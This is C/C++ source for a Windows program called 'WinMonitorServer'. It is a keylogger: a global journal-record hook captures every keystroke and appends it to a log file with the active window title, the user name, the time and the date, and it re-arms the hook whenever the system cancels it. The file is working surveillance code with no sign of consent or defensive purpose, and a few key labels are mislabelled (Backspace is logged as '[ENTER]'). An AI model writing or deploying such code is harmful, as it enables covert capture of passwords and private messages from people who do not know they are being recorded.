

#include <Lmcons.h>

#define DEF_INI_APP_NAME                    (LPCSTR)"WinMonitorServer.1.0"
#define DEF_INI_FILE_NAME                   (LPCSTR)"WinMonitorServer.1.0.ini"
#define DEF_INI_KEY_KEYBOARD_HOOK_FILE      (LPCSTR)"WinMonitorServer.1.0.KEYBOARD_HOOK_FILE"
#define DEF_INI_KEY_KEYBOARD_HOOK_INC_DATE  (LPCSTR)"WinMonitorServer.1.0.KEYBOARD_HOOK_INC_DATE"
#define DEF_INI_KEY_KEYBOARD_HOOK_INC_TIME  (LPCSTR)"WinMonitorServer.1.0.KEYBOARD_HOOK_INC_TIME"
#define DEF_INI_KEY_KEYBOARD_HOOK_INC_USER  (LPCSTR)"WinMonitorServer.1.0.KEYBOARD_HOOK_INC_USER"


HHOOK        gbl_hookKeyBoardHook=NULL;
HANDLE       gbl_hKeyBoardHookThread=NULL; 
bool         gbl_blnContinueKeyBoardHook=false;

HINSTANCE gbl_hinstCurrentInstance=NULL;

int gbl_intWndShowType=0;


bool GetKeyStroke(WPARAM key,char **Keyed)
{
	BYTE *KeyBoard;
	UINT s=0;
	unsigned short decode=0;
	static char decoded[15];

	switch(key)
	{
		case VK_RETURN  : strcpy(decoded,"[RETURN]");    	break;
		case VK_CONTROL : strcpy(decoded,"[Ctrl]");	break; 
		case VK_MENU    : strcpy(decoded,"[Alt]");     break; 
		case VK_DELETE  : strcpy(decoded,"[DEL]");     break; 
		case VK_BACK    : strcpy(decoded,"[ENTER]");   break; 
		case VK_LEFT    : strcpy(decoded,"[<-]");	    break; 
		case VK_RIGHT   : strcpy(decoded,"[->]");      break;
		case VK_TAB     : strcpy(decoded,"[TAB]");     break; 
		case VK_END     : strcpy(decoded,"[Fin]");     break; 
		case VK_NUMLOCK : strcpy(decoded,"[NumLock]"); break; 
		case VK_NUMPAD0 : strcpy(decoded,"[NumPad0]"); break; 
		case VK_NUMPAD1 : strcpy(decoded,"[NumPad1]"); break; 
		case VK_NUMPAD2 : strcpy(decoded,"[NumPad2]"); break; 
		case VK_NUMPAD3 : strcpy(decoded,"[NumPad3]"); break; 
		case VK_NUMPAD4 : strcpy(decoded,"[NumPad4]"); break; 
		case VK_NUMPAD5 : strcpy(decoded,"[NumPad5]"); break; 
		case VK_NUMPAD6 : strcpy(decoded,"[NumLoc6]"); break; 
		case VK_NUMPAD7 : strcpy(decoded,"[NumPad7]"); break; 
		case VK_NUMPAD8 : strcpy(decoded,"[NumPad8]"); break; 
		case VK_NUMPAD9 : strcpy(decoded,"[NumPad9]"); break; 
		case VK_MULTIPLY: strcpy(decoded,"[NumPad*]"); break; 
		case VK_ADD     : strcpy(decoded,"[NumPad+]"); break; 
		case VK_SUBTRACT: strcpy(decoded,"[NumPad-]"); break; 
		case VK_DIVIDE  : strcpy(decoded,"[NumPad/]"); break; 
		case VK_F1      : strcpy(decoded,"[F1]");      break;
		case VK_F2      : strcpy(decoded,"[F2]");      break;
		case VK_F3      : strcpy(decoded,"[F3]");      break;
		case VK_F4      : strcpy(decoded,"[F4]");      break; 
		case VK_F5      : strcpy(decoded,"[F5]");      break;
		case VK_F6      : strcpy(decoded,"[F6]");      break;
		case VK_F7      : strcpy(decoded,"[F7]");      break;
		case VK_F8      : strcpy(decoded,"[F8]");      break;
		case VK_F9      : strcpy(decoded,"[F9]");      break;
		case VK_F10     : strcpy(decoded,"[F10]");     break;
		case VK_F11     : strcpy(decoded,"[F11]");     break;
		case VK_F12		: strcpy(decoded,"[F12]");     break;
		case VK_F13		: strcpy(decoded,"[F13]");     break;
		case VK_F14		: strcpy(decoded,"[F14]");     break; 
		case VK_F15		: strcpy(decoded,"[F15]");     break;
		case VK_F16		: strcpy(decoded,"[F16]");     break;
		case VK_F17		: strcpy(decoded,"[F17]");     break;
		case VK_F18		: strcpy(decoded,"[F18]");     break;
		case VK_F19		: strcpy(decoded,"[F19]");     break;
		case VK_F20		: strcpy(decoded,"[F20]");     break;
	   default:
		    CGeneralMemoryUtility MemUty;
			MemUty.AllocateMem((void**)&KeyBoard,256*sizeof(BYTE)); 
	  		ZeroMemory(KeyBoard,sizeof(*KeyBoard));
			GetKeyboardState(KeyBoard);
			ToAscii((UINT)key,s,KeyBoard,&decode,0);
			decoded[0]=(char)decode;decoded[1]='\0';
			MemUty.DeleteAll((void**)&KeyBoard); 
	}
	*Keyed=decoded;
	return true;
}


bool UpdatedWindow(HWND &PrevWnd,FILE *Fstream)
{
	char thiswnd[200];
	TCHAR tchrTmp[UNLEN + 1];
	DWORD len2=UNLEN;
	HWND hwnd=GetForegroundWindow();

	GetWindowText(hwnd,thiswnd,200);

	if(!PrevWnd || hwnd!=PrevWnd)
	{
		PrevWnd=hwnd; 
		try { _fputts(_T("\n\n"),Fstream); } catch(...) {}

		GetPrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_USER,"T",tchrTmp,10,DEF_INI_FILE_NAME); 
		
		if(tchrTmp[0]==_T('T') && GetUserName((LPTSTR)tchrTmp,&len2)) 
			try { _fputts(_T("\nUser>"),Fstream),_fputts(tchrTmp,Fstream); } catch(...) {}
			 		
		try {_fputts(_T("\nWindow>"),Fstream),_fputts((TCHAR*)thiswnd,Fstream); } catch(...) {}
		
		GetPrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_TIME,"T",tchrTmp,10,DEF_INI_FILE_NAME); 
		if(tchrTmp[0]==_T('T')) 
		{
			GetTimeFormat(LOCALE_SYSTEM_DEFAULT, TIME_NOSECONDS, NULL, "HH':'mm tt",thiswnd,200);
			try { _fputts(_T("\nTime>"),Fstream),_fputts((TCHAR*)thiswnd,Fstream); } catch(...) {}
		}
		
		GetPrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_DATE,"T",tchrTmp,10,DEF_INI_FILE_NAME); 
		if(tchrTmp[0]==_T('T')) 
		{
			GetDateFormat(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, NULL, NULL, thiswnd,200);
			try { _fputts(_T("\nDate>"),Fstream),_fputts((TCHAR*)thiswnd,Fstream),_fputts(_T("\n\n"),Fstream); } catch(...) {}
		}

		return true;
	}
	return false;
}

LRESULT CALLBACK KeyboardProc(int cde,WPARAM w,LPARAM l)
{  
	if(cde<0||cde!=HC_ACTION) return CallNextHookEx((HHOOK)gbl_hookKeyBoardHook,cde,w,l); 	 	
	EVENTMSG *pEvt=(EVENTMSG *)l;
	if(pEvt->message!=WM_KEYDOWN) return CallNextHookEx((HHOOK)gbl_hookKeyBoardHook,cde,w,l); 	 	
	UINT W=LOBYTE(pEvt->paramL);
	static HWND Wnd=0; 
	static char *decoded=0;
	if(GetKeyStroke(W,&decoded))
	{	TCHAR LogFile[801];
		GetPrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_FILE,"Log.txt",LogFile,800,DEF_INI_FILE_NAME); 
		FILE *f=fopen(LogFile,"a+");
		if(!f) return CallNextHookEx((HHOOK)gbl_hookKeyBoardHook,cde,w,l);
		UpdatedWindow(Wnd,f); 
	   _fputts((TCHAR*)decoded,f);
	 	fclose(f);
	}
	return CallNextHookEx((HHOOK)gbl_hookKeyBoardHook,cde,w,l); 	 	
}


DWORD WINAPI KeyboardHookThread(LPVOID Fname)
{
MSG msg;
BYTE keytbl[256];
int i;
for(i=0;i<256;i++) keytbl[i]=0;

	 gbl_hookKeyBoardHook=(HHOOK)::SetWindowsHookEx(WH_JOURNALRECORD,(HOOKPROC)KeyboardProc,(HMODULE)Fname,NULL);
	 if(!gbl_hookKeyBoardHook) return 0;
	 while(gbl_blnContinueKeyBoardHook)
	 {
		while(PeekMessage(&msg,NULL,0,0,PM_NOREMOVE)) 
			if(GetMessage(&msg,NULL,0,0),msg.message==WM_CANCELJOURNAL)
				if(SetKeyboardState(keytbl),
				  (gbl_hookKeyBoardHook=(HHOOK)::SetWindowsHookEx(WH_JOURNALRECORD,(HOOKPROC)KeyboardProc,(HMODULE)Fname,NULL))
				   ==0) return 0;
				else ;
			else DispatchMessage(&msg);
		 
		Sleep(1); 	
	 }
	 ::UnhookWindowsHookEx((HHOOK)gbl_hookKeyBoardHook);
	 gbl_hookKeyBoardHook=0;
	 return 0;
}

bool InstallKeyBoardHook(void)
{
	if(!gbl_hKeyBoardHookThread)
	{
		gbl_blnContinueKeyBoardHook=true;
		if((gbl_hKeyBoardHookThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&KeyboardHookThread,(LPVOID)gbl_hinstCurrentInstance,NULL,NULL))==0)
			return false;
	}
	return true;
}

bool UnInstallKeyBoardHook(void)
{
	if(gbl_hKeyBoardHookThread)
	{
		gbl_blnContinueKeyBoardHook=false;
		DWORD ExitCode;
		if(GetExitCodeThread(gbl_hKeyBoardHookThread,&ExitCode))
			if(ExitCode==STILL_ACTIVE)
				if(WaitForSingleObject(gbl_hKeyBoardHookThread,1500)!=WAIT_OBJECT_0)
				{
					TerminateThread(gbl_hKeyBoardHookThread,0);
					::UnhookWindowsHookEx((HHOOK)gbl_hookKeyBoardHook);
				}
	}
	gbl_hKeyBoardHookThread=0;
	gbl_hookKeyBoardHook=0;
	return true;		
}
